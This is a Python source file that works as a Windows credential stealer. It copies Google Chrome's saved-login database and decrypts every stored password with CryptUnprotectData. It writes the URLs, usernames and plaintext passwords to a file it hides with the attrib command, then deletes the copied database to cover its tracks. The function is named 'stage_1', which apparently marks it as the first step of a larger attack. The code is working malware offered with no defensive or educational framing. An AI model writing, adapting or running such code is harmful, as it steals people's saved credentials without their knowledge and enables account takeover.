from os import getenv
import os
import sqlite3
import win32crypt
import shutil
import time
import base64
import subprocess

def stage_1():
	#Extract the database of chrome passwords from the route
	shutil.copy(getenv("APPDATA") + r"\..\Local\Google\Chrome\User Data\Default\Login Data", 'LoginData.db')
	#Hide the copied database from user eyes
	subprocess.check_call(["attrib","+H","LoginData.db"])
	#Waits for database to be copied
	time.sleep(2)
	conn = sqlite3.connect("LoginData.db")
	filename = "stage1.txt"
	cursor = conn.cursor()
	myfile = open(filename, 'w')
	subprocess.check_call(["attrib","+H",filename])
	cursor.execute('SELECT action_url, username_value, password_value FROM logins')
	#Decrypts database
	for result in cursor.fetchall():
		try:
			password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
			url = result[0]
			username = result[1]
			if password:
				myfile.write("{: <70}".format(url) + "{: <70}".format(username) + "{: <70}".format(password.decode('utf-8')) + "\n")
		except:
			pass

	myfile.close()
	conn.close()
	os.remove('LoginData.db') #Remove the copyed database
